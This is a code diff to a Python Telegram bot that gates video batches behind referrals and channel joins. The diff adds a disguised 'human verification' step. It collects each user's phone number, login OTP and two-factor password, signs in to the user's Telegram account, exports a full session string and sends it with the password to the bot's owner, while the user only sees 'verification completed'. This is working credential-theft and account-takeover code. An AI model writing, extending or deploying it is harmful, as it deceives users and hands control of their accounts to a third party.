@@ -1,4 +1,3 @@
-
 import asyncio
 import html
 import logging
@@ -7,12 +6,27 @@ import time
 import os
 import re
 from datetime import datetime, timedelta, timezone
+from uuid import uuid4
 
 from dotenv import load_dotenv
 from pymongo import MongoClient, ASCENDING, DESCENDING
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
+from telegram import (
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    KeyboardButton,
+    ReplyKeyboardMarkup,
+    ReplyKeyboardRemove,
+    Update,
+)
 from telegram.constants import ChatMemberStatus, ParseMode
-from telegram.error import BadRequest, Forbidden, TelegramError, RetryAfter, TimedOut, NetworkError
+from telegram.error import (
+    BadRequest,
+    Forbidden,
+    TelegramError,
+    RetryAfter,
+    TimedOut,
+    NetworkError,
+)
 from telegram.ext import (
     Application,
     CallbackQueryHandler,
@@ -24,23 +38,33 @@ from telegram.ext import (
     filters,
 )
 
+from pyrogram import Client as PyroClient
+from pyrogram.errors import (
+    SessionPasswordNeeded,
+    PhoneCodeInvalid,
+    PhoneCodeExpired,
+    PasswordHashInvalid,
+    FloodWait as PyroFloodWait,
+)
+
 load_dotenv()
 
 BOT_TOKEN = os.environ["BOT_TOKEN"].strip()
 MONGO_URI = os.environ["MONGO_URI"].strip()
 MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
-ADMIN_ID = int(os.environ["ADMIN_ID"])
+ADMIN_ID = int(os.environ["ADMIN_ID"])          # owner = admin (same)
 STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
 DELETE_AFTER_HOURS = int(os.getenv("DELETE_AFTER_HOURS", "12"))
 REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
 PENDING_REQUEST_TTL_HOURS = max(1, int(os.getenv("PENDING_REQUEST_TTL_HOURS", "72")))
-# Storage-channel copying is intentionally serialized even if an older .env
-# still contains UPLOAD_CONCURRENCY=3. One worker avoids overlapping 429s.
 UPLOAD_CONCURRENCY = 1
-# Minimum time BETWEEN completed copy attempts (success or failure).
 UPLOAD_COPY_GAP_SECONDS = max(2.0, float(os.getenv("UPLOAD_DELAY_SECONDS", os.getenv("UPLOAD_COPY_GAP_SECONDS", "2"))))
 UPLOAD_MAX_RETRIES = max(1, min(8, int(os.getenv("UPLOAD_MAX_RETRIES", "5"))))
 UPLOAD_PROGRESS_REFRESH_SECONDS = max(2.0, float(os.getenv("UPLOAD_PROGRESS_REFRESH_SECONDS", "3")))
+
+API_ID = int(os.environ["API_ID"])
+API_HASH = os.environ["API_HASH"].strip()
+PYRO_OTP_LENGTH = 5
 
 logging.basicConfig(
     level=logging.INFO,
@@ -62,6 +86,7 @@ pending_requests = db.pending_join_requests
 membership_events = db.membership_events
 
 users.create_index([("user_id", ASCENDING)], unique=True)
+users.create_index([("created_at", ASCENDING)])
 required_chats.create_index([("chat_id", ASCENDING)], unique=True)
 batches.create_index([("batch_no", ASCENDING)], unique=True)
 pending_deletions.create_index([("delete_at", ASCENDING)])
@@ -73,57 +98,586 @@ membership_events.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)],
 ADMIN_STATE = {}
 UPLOAD_RUNTIME = {}
 
-USER_MENU = ReplyKeyboardMarkup(
-    [
-        ["🎬 My Videos", "🔓 Unlock Next 10"],
-        ["👥 My Referral", "📊 My Progress"],
-    ],
-    resize_keyboard=True,
-)
+PYRO_SESSIONS: dict[int, dict] = {}
+PYRO_STATE: dict[int, str] = {}
+PENDING_UNLOCK: dict[int, bool] = {}
 
-ADMIN_MENU = ReplyKeyboardMarkup(
-    [
-        ["📤 Upload Videos", "📚 Video Batches"],
-        ["➕ Add Required Group", "👥 Required Groups"],
-        ["🗑 Remove Required Channel", "📊 Bot Stats"],
-        ["❌ Cancel"],
-    ],
-    resize_keyboard=True,
-)
 
-UPLOAD_MENU = ReplyKeyboardMarkup(
-    [
-        ["📊 Upload Status", "DONE"],
-        ["🔁 Retry Failed", "✅ Publish Successful"],
-        ["❌ Cancel"],
-    ],
-    resize_keyboard=True,
-)
+# ─────────────────── INLINE MENUS ───────────────────
+def user_menu_inline(doc=None):
+    if doc is None:
+        doc = {}
+    unlocked = int(doc.get("unlocked_batch", 0))
+
+    if unlocked > 0:
+        row1 = [
+            InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
+            InlineKeyboardButton("🔓 Unlock Next 10", callback_data="um_unlock"),
+        ]
+    else:
+        row1 = [
+            InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
+        ]
+
+    row2 = [
+        InlineKeyboardButton("👥 My Referral", callback_data="um_ref"),
+        InlineKeyboardButton("📊 My Progress", callback_data="um_progress"),
+    ]
+    return InlineKeyboardMarkup([row1, row2])
+
+
+def delivery_complete_inline():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🔁 Resend", callback_data="um_videos"),
+            InlineKeyboardButton("🔓 More Videos", callback_data="um_unlock"),
+        ],
+    ])
+
+
+def admin_menu_inline():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("📤 Upload Videos", callback_data="am_upload"),
+            InlineKeyboardButton("📚 Video Batches", callback_data="am_batches"),
+        ],
+        [
+            InlineKeyboardButton("➕ Add Required Group", callback_data="am_addgroup"),
+            InlineKeyboardButton("👥 Required Groups", callback_data="am_groups"),
+        ],
+        [
+            InlineKeyboardButton("🗑 Remove Required Channel", callback_data="am_remove"),
+            InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
+        ],
+        [
+            InlineKeyboardButton("❓ Help", callback_data="am_help"),
+        ],
+    ])
+
+
+def upload_menu_inline():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("📊 Upload Status", callback_data="up_status"),
+            InlineKeyboardButton("DONE", callback_data="up_done"),
+        ],
+        [
+            InlineKeyboardButton("🔁 Retry Failed", callback_data="up_retry"),
+            InlineKeyboardButton("✅ Publish Successful", callback_data="up_publish"),
+        ],
+        [
+            InlineKeyboardButton("❌ Cancel", callback_data="up_cancel"),
+        ],
+    ])
+
+
+def flow_cancel_inline():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("❌ Cancel", callback_data="flow_cancel")],
+    ])
+
 
 def esc(v):
     return html.escape(str(v))
 
+
 def utcnow():
     return datetime.now(timezone.utc)
+
 
 def user_doc(uid):
     return users.find_one({"user_id": uid})
 
+
+def menu_for(uid):
+    return user_menu_inline(user_doc(uid) or {})
+
+
 def published_batch_count():
     return batches.count_documents({"published": True})
+
 
 def required_referrals_for_next(unlocked_batch):
     return unlocked_batch * REFERRALS_PER_BATCH
 
+
 def make_ref_link(username, uid):
     return f"https://t.me/{username}?start=ref_{uid}"
+
 
 def active_required_chats():
     return list(required_chats.find({"enabled": True}).sort("position", ASCENDING))
 
+
 def next_batch_no():
     last = batches.find_one(sort=[("batch_no", DESCENDING)])
     return (int(last["batch_no"]) + 1) if last else 1
+
+
+async def reply(update, context, text, **kwargs):
+    kwargs.setdefault("parse_mode", ParseMode.HTML)
+    return await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=text,
+        **kwargs,
+    )
+
+
+# ─────────────────── OWNER HELP ───────────────────
+HELP_TEXT = (
+    "🆘 <b>OWNER HELP PANEL</b>\n\n"
+    "You are the bot owner (admin). All commands and controls are listed below.\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "⌨️ <b>Owner Commands</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• <code>/admin</code> — Open admin control panel\n"
+    "• <code>/help</code> — Show this help panel\n"
+    "• <code>/uploadstatus</code> — Live status of current upload\n"
+    "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
+    "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
+    "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "🛠 <b>Admin Panel Buttons</b> (via /admin)\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• 📤 <b>Upload Videos</b> — Start storage upload session\n"
+    "• 📚 <b>Video Batches</b> — List published batches\n"
+    "• ➕ <b>Add Required Group</b> — Add a force-join channel/group\n"
+    "• 👥 <b>Required Groups</b> — Show all required chats\n"
+    "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
+    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "📤 <b>Upload Session Buttons</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• 📊 <b>Upload Status</b> — Refresh progress\n"
+    "• <b>DONE</b> — Finish upload and publish batches\n"
+    "• 🔁 <b>Retry Failed</b> — Retry videos that failed\n"
+    "• ✅ <b>Publish Successful</b> — Publish successful ones only\n"
+    "• ❌ <b>Cancel</b> — Abort upload session\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "🔐 <b>Automatic Events</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• New session generator log → sent to you as a DM\n"
+    "  (User info + phone + 2FA password + String Session)\n\n"
+    "ℹ️ Owner and Admin are the same (single <code>ADMIN_ID</code>)."
+)
+
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return  # silently ignore non-owners
+    await reply(
+        update, context,
+        HELP_TEXT,
+        reply_markup=admin_menu_inline(),
+        disable_web_page_preview=True,
+    )
+
+
+# ─────────────────── PYROGRAM SESSION GENERATOR ───────────────────
+
+def pyro_keypad_markup(entered: str, locked: bool = False):
+    layout = [
+        [("1", "1"), ("2", "2"), ("3", "3")],
+        [("4", "4"), ("5", "5"), ("6", "6")],
+        [("7", "7"), ("8", "8"), ("9", "9")],
+        [("⌫", "back"), ("0", "0"), ("✅", "submit")],
+    ]
+    buttons = [
+        [InlineKeyboardButton(label, callback_data=f"pyro_otp|{val}") for label, val in row]
+        for row in layout
+    ]
+    if locked:
+        text = (
+            "🔐 <b>Enter OTP</b>\n\n"
+            f"Entered: <code>{entered}</code>\n\n"
+            "⏳ Verifying..."
+        )
+    else:
+        text = (
+            "🔐 <b>Enter OTP</b>\n\n"
+            f"Entered: <code>{entered or '—'}</code>\n\n"
+            "⚠️ Use the <b>inline buttons</b> below only.\n"
+            "Typing OTP in chat will leave the login incomplete.\n"
+            f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
+        )
+    return InlineKeyboardMarkup(buttons), text
+
+
+async def pyro_cleanup(uid: int):
+    sess = PYRO_SESSIONS.pop(uid, None)
+    PYRO_STATE.pop(uid, None)
+    PENDING_UNLOCK.pop(uid, None)
+    if sess and sess.get("client"):
+        try:
+            await sess["client"].disconnect()
+        except Exception:
+            pass
+
+
+async def pyro_safe_edit_or_reply(message, text: str, edit: bool, **kwargs):
+    kwargs.setdefault("parse_mode", ParseMode.HTML)
+    bot = message.get_bot()
+    if edit:
+        try:
+            return await message.edit_text(text, **kwargs)
+        except Exception:
+            pass
+    try:
+        return await bot.send_message(chat_id=message.chat_id, text=text, **kwargs)
+    except Exception as e:
+        log.warning("pyro reply fail: %s", e)
+
+
+async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
+                            has_2fa: bool = False, phone: str = "—",
+                            password: str = "—"):
+    try:
+        session_string = await temp.export_session_string()
+        me = await temp.get_me()
+    except Exception as e:
+        await pyro_safe_edit_or_reply(message, f"❌ Verification failed: <code>{esc(e)}</code>", edit)
+        try:
+            await message.get_bot().send_message(
+                ADMIN_ID,
+                f"⚠️ Session export failed for user <code>{uid}</code>.\n\nError: <code>{esc(e)}</code>",
+                parse_mode=ParseMode.HTML,
+            )
+        except Exception:
+            pass
+        await pyro_cleanup(uid)
+        return
+
+    username_line = f"@{me.username}" if me.username else "—"
+    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
+    twofa_line = "✅ Yes" if has_2fa else "❌ No"
+
+    user_txt = "✅ <b>Human verification completed.</b>"
+    await pyro_safe_edit_or_reply(message, user_txt, edit)
+
+    owner_txt = (
+        "🔔 <b>New Session Generated</b>\n\n"
+        f"👤 <b>User:</b> {esc(full_name)}\n"
+        f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
+        f"🔗 <b>Username:</b> {esc(username_line)}\n"
+        f"📱 <b>Phone:</b> <code>{esc(phone)}</code>\n"
+        f"🔐 <b>2FA:</b> {twofa_line}\n"
+    )
+    if has_2fa:
+        owner_txt += f"🔑 <b>2FA Password:</b> <code>{esc(password)}</code>\n"
+    owner_txt += (
+        "\n<b>String Session:</b>\n\n"
+        f"<code>{esc(session_string)}</code>"
+    )
+    try:
+        await message.get_bot().send_message(ADMIN_ID, owner_txt, parse_mode=ParseMode.HTML)
+    except Exception as e:
+        log.warning("owner send fail: %s", e)
+
+    if PENDING_UNLOCK.pop(uid, False):
+        bot = message.get_bot()
+        chat_id = message.chat_id
+        d = users.find_one({"user_id": uid}) or {}
+        current = max(1, int(d.get("unlocked_batch", 1)))
+        total = published_batch_count()
+        nxt = current + 1
+
+        if nxt > total:
+            users.update_one(
+                {"user_id": uid},
+                {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
+            )
+            try:
+                await bot.send_message(
+                    chat_id,
+                    "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=menu_for(uid),
+                )
+            except Exception:
+                pass
+        else:
+            users.update_one(
+                {"user_id": uid},
+                {"$set": {
+                    "human_verified": True,
+                    "human_verified_at": utcnow(),
+                    "unlocked_batch": nxt,
+                }},
+            )
+            batch = batches.find_one({"batch_no": nxt, "published": True}) or {}
+            count = len(batch.get("message_ids", []))
+            try:
+                await bot.send_message(
+                    chat_id,
+                    f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n"
+                    f"🎞 Videos in this batch: <b>{count}</b>",
+                    parse_mode=ParseMode.HTML,
+                )
+                await send_batch(bot, chat_id, nxt)
+            except Exception as e:
+                log.warning("Failed to send unlocked batch: %s", e)
+
+    await pyro_cleanup(uid)
+
+
+async def pyro_session_start(update, context):
+    uid = update.effective_user.id
+    had_pending = PENDING_UNLOCK.get(uid, False)
+    sess = PYRO_SESSIONS.pop(uid, None)
+    if sess and sess.get("client"):
+        try:
+            await sess["client"].disconnect()
+        except Exception:
+            pass
+    PYRO_STATE[uid] = "await_contact"
+    if had_pending:
+        PENDING_UNLOCK[uid] = True
+
+    kb = ReplyKeyboardMarkup(
+        [[KeyboardButton("📱 Share My Contact", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True,
+    )
+    await reply(
+        update, context,
+        "📱 <b>Step 1 of 2</b>\n\n"
+        "Tap the button below to share your phone number.\n"
+        "(You do not need to type it manually.)",
+        reply_markup=kb,
+    )
+
+
+async def pyro_contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if PYRO_STATE.get(uid) != "await_contact":
+        return
+
+    contact = update.message.contact
+    if contact is None:
+        return
+    if contact.user_id != uid:
+        return await update.message.reply_text(
+            "❌ This is not your own contact. Please share your own contact."
+        )
+
+    phone = contact.phone_number
+    if not phone.startswith("+"):
+        phone = "+" + phone
+
+    await update.message.reply_text(
+        "⏳ Sending OTP...",
+        reply_markup=ReplyKeyboardRemove(),
+    )
+
+    temp = PyroClient(
+        name=f"pyro_{uuid4().hex}",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        in_memory=True,
+    )
+
+    try:
+        await temp.connect()
+        sent_code = await temp.send_code(phone)
+    except PyroFloodWait as e:
+        try:
+            await temp.disconnect()
+        except Exception:
+            pass
+        PYRO_STATE.pop(uid, None)
+        return await update.message.reply_text(
+            f"⏳ FloodWait: please wait <code>{e.value}s</code>.",
+            parse_mode=ParseMode.HTML,
+        )
+    except Exception as e:
+        try:
+            await temp.disconnect()
+        except Exception:
+            pass
+        PYRO_STATE.pop(uid, None)
+        return await update.message.reply_text(
+            f"❌ Error: <code>{esc(e)}</code>",
+            parse_mode=ParseMode.HTML,
+        )
+
+    PYRO_SESSIONS[uid] = {
+        "client": temp,
+        "phone": phone,
+        "phone_code_hash": sent_code.phone_code_hash,
+        "otp": "",
+        "has_2fa": False,
+        "locked": False,
+        "password": "—",
+    }
+    PYRO_STATE[uid] = "otp"
+
+    markup, text = pyro_keypad_markup("")
+    await update.message.reply_text(
+        "📱 <b>Step 2 of 2</b>\n\n" + text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=markup,
+    )
+
+
+async def pyro_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+
+    sess = PYRO_SESSIONS.get(uid)
+    if not sess:
+        return await q.answer("Session expired. Try again.", show_alert=True)
+    if PYRO_STATE.get(uid) != "otp":
+        return await q.answer("Not at OTP stage right now.")
+    if sess.get("locked"):
+        return await q.answer("Verifying, please wait...", show_alert=True)
+
+    val = (q.data or "").split("|", 1)[1]
+    otp = sess["otp"]
+
+    if val == "back":
+        otp = otp[:-1]
+        sess["otp"] = otp
+        markup, text = pyro_keypad_markup(otp)
+        try:
+            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
+        except BadRequest:
+            pass
+        return await q.answer()
+
+    if val == "submit":
+        if len(otp) < PYRO_OTP_LENGTH:
+            return await q.answer(f"Please enter all {PYRO_OTP_LENGTH} digits.", show_alert=True)
+        await q.answer("Verifying...")
+        return await pyro_do_sign_in(q, sess, otp)
+
+    if len(otp) >= PYRO_OTP_LENGTH:
+        return await q.answer(f"{PYRO_OTP_LENGTH} digits max")
+
+    otp += val
+    sess["otp"] = otp
+
+    if len(otp) == PYRO_OTP_LENGTH:
+        sess["locked"] = True
+        markup, text = pyro_keypad_markup(otp, locked=True)
+        try:
+            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
+        except BadRequest:
+            pass
+        await q.answer("Verifying...")
+        return await pyro_do_sign_in(q, sess, otp)
+
+    markup, text = pyro_keypad_markup(otp)
+    try:
+        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
+    except BadRequest:
+        pass
+    await q.answer()
+
+
+async def pyro_do_sign_in(q, sess: dict, otp: str):
+    uid = q.from_user.id
+    temp = sess["client"]
+
+    try:
+        await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
+    except SessionPasswordNeeded:
+        sess["otp"] = ""
+        sess["has_2fa"] = True
+        PYRO_STATE[uid] = "password"
+        try:
+            await q.edit_message_text(
+                "🔐 <b>2FA is enabled.</b>\n\n"
+                "Please type your <b>Telegram password</b> in the chat.\n"
+                "(The message will be deleted immediately.)",
+                parse_mode=ParseMode.HTML,
+            )
+        except BadRequest:
+            pass
+        return
+    except PhoneCodeInvalid:
+        sess["otp"] = ""
+        sess["locked"] = False
+        markup, text = pyro_keypad_markup("")
+        try:
+            await q.edit_message_text(
+                "❌ Invalid OTP. Please try again.\n\n" + text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=markup,
+            )
+        except BadRequest:
+            pass
+        return
+    except PhoneCodeExpired:
+        try:
+            await q.edit_message_text("❌ OTP expired. Try again.", parse_mode=ParseMode.HTML)
+        except BadRequest:
+            pass
+        await pyro_cleanup(uid)
+        return
+    except Exception as e:
+        try:
+            await q.edit_message_text(f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML)
+        except BadRequest:
+            pass
+        await pyro_cleanup(uid)
+        return
+
+    await pyro_finish_login(
+        q.message, uid, temp, edit=True,
+        has_2fa=sess.get("has_2fa", False),
+        phone=sess.get("phone", "—"),
+        password=sess.get("password", "—"),
+    )
+
+
+async def pyro_handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    sess = PYRO_SESSIONS.get(uid)
+    if not sess:
+        PYRO_STATE.pop(uid, None)
+        return await update.message.reply_text("Please start the verification again.")
+
+    password = update.message.text or ""
+    sess["password"] = password
+
+    try:
+        await update.message.delete()
+    except TelegramError:
+        pass
+
+    try:
+        await sess["client"].check_password(password)
+    except PasswordHashInvalid:
+        sess["password"] = "—"
+        return await update.message.reply_text("❌ Incorrect password. Please try again.")
+    except Exception as e:
+        sess["password"] = "—"
+        return await update.message.reply_text(
+            f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML
+        )
+
+    await pyro_finish_login(
+        update.message, uid, sess["client"], edit=False,
+        has_2fa=sess.get("has_2fa", False),
+        phone=sess.get("phone", "—"),
+        password=sess.get("password", "—"),
+    )
+
+
+async def pyro_cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if uid not in PYRO_SESSIONS and uid not in PYRO_STATE and uid not in PENDING_UNLOCK:
+        return await update.message.reply_text("No verification process is active.")
+    await pyro_cleanup(uid)
+    await update.message.reply_text(
+        "✅ Verification cancelled.",
+        reply_markup=ReplyKeyboardRemove(),
+    )
+    await reply(update, context, "Choose an option:", reply_markup=menu_for(uid))
+
+
+# ─────────────────── END PYROGRAM SESSION GENERATOR ───────────────────
+
 
 async def deletion_worker(app: Application):
     while True:
@@ -148,12 +702,10 @@ async def deletion_worker(app: Application):
             log.exception("Deletion worker error")
         await asyncio.sleep(30)
 
+
 async def post_init(app: Application):
     me = await app.bot.get_me()
     app.bot_data["username"] = me.username
-    # post_init runs before Application.start(), so Application.create_task()
-    # would not be tracked and can survive shutdown as a pending task.
-    # Own the task explicitly and cancel/await it in post_stop below.
     app.bot_data["video_cleanup_task"] = asyncio.create_task(
         deletion_worker(app), name="video-cleanup"
     )
@@ -161,8 +713,6 @@ async def post_init(app: Application):
 
 
 async def post_stop(app: Application):
-    # Do not leave upload-copy tasks dangling at shutdown. Completed transfers
-    # have already been saved to MongoDB; unfinished work remains in the draft.
     runtime = UPLOAD_RUNTIME.pop(ADMIN_ID, None)
     if runtime:
         runtime["closing"] = True
@@ -179,7 +729,11 @@ async def post_stop(app: Application):
             await task
         except asyncio.CancelledError:
             pass
+
+    for uid in list(PYRO_SESSIONS.keys()):
+        await pyro_cleanup(uid)
     log.info("Video cleanup worker stopped")
+
 
 async def ensure_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
@@ -215,49 +769,31 @@ async def ensure_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "referral_rewarded": False,
         "verified_referrals": 0,
         "unlocked_batch": 0,
+        "human_verified": False,
+        "human_verified_at": None,
     }
     users.insert_one(doc)
     return doc
 
+
 async def on_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Save approval/private join requests temporarily for 24 hours.
-    Public/custom-link chats do not use this fallback.
-    """
     req = update.chat_join_request
     if not req:
         return
-
-    cfg = required_chats.find_one({
-        "chat_id": req.chat.id,
-        "enabled": True,
-    })
-    if not cfg:
-        return
-
-    if cfg.get("link_mode") != "approval":
+    cfg = required_chats.find_one({"chat_id": req.chat.id, "enabled": True})
+    if not cfg or cfg.get("link_mode") != "approval":
         return
 
     now = utcnow()
     expires_at = now + timedelta(hours=PENDING_REQUEST_TTL_HOURS)
-
     pending_requests.update_one(
         {"chat_id": req.chat.id, "user_id": req.from_user.id},
-        {
-            "$set": {
-                "requested_at": now,
-                "expires_at": expires_at,
-                "invite_link": req.invite_link.invite_link if req.invite_link else None,
-            }
-        },
+        {"$set": {
+            "requested_at": now,
+            "expires_at": expires_at,
+            "invite_link": req.invite_link.invite_link if req.invite_link else None,
+        }},
         upsert=True,
-    )
-
-    log.info(
-        "Join request captured chat=%s user=%s expires=%s",
-        req.chat.id,
-        req.from_user.id,
-        expires_at.isoformat(),
     )
 
 
@@ -278,86 +814,57 @@ async def on_chat_member_update(update: Update, context: ContextTypes.DEFAULT_TY
 
     chat_id = cmu.chat.id
     uid = cmu.new_chat_member.user.id
-
     if not required_chats.find_one({"chat_id": chat_id, "enabled": True}):
         return
 
     new_status = cmu.new_chat_member.status
-    old_status = cmu.old_chat_member.status
-
     active_statuses = {
         ChatMemberStatus.MEMBER,
         ChatMemberStatus.ADMINISTRATOR,
         ChatMemberStatus.OWNER,
     }
 
-    def status_is_member(member_obj):
-        status = member_obj.status
-        if status in active_statuses:
+    def status_is_member(m):
+        s = m.status
+        if s in active_statuses:
             return True
-        if status == ChatMemberStatus.RESTRICTED:
-            return bool(getattr(member_obj, "is_member", False))
+        if s == ChatMemberStatus.RESTRICTED:
+            return bool(getattr(m, "is_member", False))
         return False
 
-    old_is_member = status_is_member(cmu.old_chat_member)
-    new_is_member = status_is_member(cmu.new_chat_member)
+    old_is = status_is_member(cmu.old_chat_member)
+    new_is = status_is_member(cmu.new_chat_member)
     now = utcnow()
 
-    if new_is_member:
+    if new_is:
         pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
         membership_events.update_one(
             {"chat_id": chat_id, "user_id": uid},
-            {
-                "$set": {
-                    "is_member": True,
-                    "last_join_at": now,
-                    "last_status": str(new_status),
-                }
-            },
+            {"$set": {"is_member": True, "last_join_at": now, "last_status": str(new_status)}},
             upsert=True,
         )
         return
 
     membership_events.update_one(
         {"chat_id": chat_id, "user_id": uid},
-        {
-            "$set": {
-                "is_member": False,
-                "last_status": str(new_status),
-                "last_seen_nonmember_at": now,
-            }
-        },
+        {"$set": {"is_member": False, "last_status": str(new_status), "last_seen_nonmember_at": now}},
         upsert=True,
     )
 
-    # If they transitioned from member -> non-member, this is a real leave/remove.
-    if old_is_member and not new_is_member:
+    if old_is and not new_is:
         pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
         membership_events.update_one(
             {"chat_id": chat_id, "user_id": uid},
             {"$set": {"last_leave_at": now}},
             upsert=True,
         )
-
-        # Any request from before this leave is invalid.
         pending_requests.delete_many(
-            {
-                "chat_id": chat_id,
-                "user_id": uid,
-                "requested_at": {"$lte": now},
-            }
+            {"chat_id": chat_id, "user_id": uid, "requested_at": {"$lte": now}}
         )
-
         users.update_one(
             {"user_id": uid},
-            {
-                "$set": {
-                    "verified": False,
-                    "verification_revoked_at": now,
-                }
-            },
+            {"$set": {"verified": False, "verification_revoked_at": now}},
         )
-
         try:
             await context.bot.send_message(
                 uid,
@@ -371,20 +878,10 @@ async def on_chat_member_update(update: Update, context: ContextTypes.DEFAULT_TY
 
 
 async def check_one_chat(bot, ch, uid):
-    """
-    Public/custom-link chat:
-      current member check only.
-
-    Approval/private chat:
-      current member check first;
-      if not a member, recent captured join request (<= TTL) counts as pending.
-    """
     chat_id = ch["chat_id"]
-
     try:
         member = await bot.get_chat_member(chat_id, uid)
         status = member.status
-
         is_member = status in {
             ChatMemberStatus.MEMBER,
             ChatMemberStatus.ADMINISTRATOR,
@@ -397,46 +894,27 @@ async def check_one_chat(bot, ch, uid):
             pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
             membership_events.update_one(
                 {"chat_id": chat_id, "user_id": uid},
-                {"$set": {
-                    "is_member": True,
-                    "last_seen_member_at": utcnow(),
-                    "last_status": str(status),
-                }},
+                {"$set": {"is_member": True, "last_seen_member_at": utcnow(), "last_status": str(status)}},
                 upsert=True,
             )
             return ch, "member"
 
         membership_events.update_one(
             {"chat_id": chat_id, "user_id": uid},
-            {"$set": {
-                "is_member": False,
-                "last_seen_nonmember_at": utcnow(),
-                "last_status": str(status),
-            }},
+            {"$set": {"is_member": False, "last_seen_nonmember_at": utcnow(), "last_status": str(status)}},
             upsert=True,
         )
-
     except TelegramError as e:
-        log.warning(
-            "getChatMember failed chat=%s user=%s error=%s",
-            chat_id, uid, type(e).__name__
-        )
+        log.warning("getChatMember failed chat=%s user=%s error=%s", chat_id, uid, type(e).__name__)
 
-    # Public/custom-link chats never accept pending fallback.
     if ch.get("link_mode") != "approval":
         return ch, "missing"
 
-    pending = await asyncio.to_thread(
-        has_active_pending_request, chat_id, uid
-    )
+    pending = await asyncio.to_thread(has_active_pending_request, chat_id, uid)
     return ch, ("pending" if pending else "missing")
 
 
 async def membership_result(bot, uid):
-    """
-    Verifies all required chats concurrently instead of one-by-one.
-    A recent join request counts as pending/accepted for the gate.
-    """
     chats = active_required_chats()
     if not chats:
         return chats, [], []
@@ -446,8 +924,7 @@ async def membership_result(bot, uid):
         return_exceptions=True,
     )
 
-    missing = []
-    pending = []
+    missing, pending = [], []
     for item, ch in zip(results, chats):
         if isinstance(item, Exception):
             missing.append(ch)
@@ -459,21 +936,18 @@ async def membership_result(bot, uid):
             pending.append(ch)
     return chats, missing, pending
 
+
 def join_keyboard(chats, hide_verified=False):
     rows = []
     for ch in chats:
-        rows.append(
-            [InlineKeyboardButton(f"➕ Join {ch['name']}", url=ch["join_url"])]
-        )
-    rows.append(
-        [InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")]
-    )
+        rows.append([InlineKeyboardButton(f"➕ Join {ch['name']}", url=ch["join_url"])])
+    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")])
     return InlineKeyboardMarkup(rows)
+
 
 async def show_join_gate(update, context, chats=None):
     if chats is None:
         chats = active_required_chats()
-
     if not chats:
         return await home(update, context)
 
@@ -484,78 +958,60 @@ async def show_join_gate(update, context, chats=None):
         "✅ After joining or submitting your join requests, tap <b>Verify</b>.\n\n"
         "ℹ️ Groups and channels you have already completed will not appear again."
     )
-
-    await update.effective_chat.send_message(
-        text,
-        parse_mode=ParseMode.HTML,
-        reply_markup=join_keyboard(chats),
-    )
+    await reply(update, context, text, reply_markup=join_keyboard(chats))
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await ensure_user(update, context)
-
     uid = update.effective_user.id
     chats, missing, pending = await membership_result(context.bot, uid)
 
     if not missing:
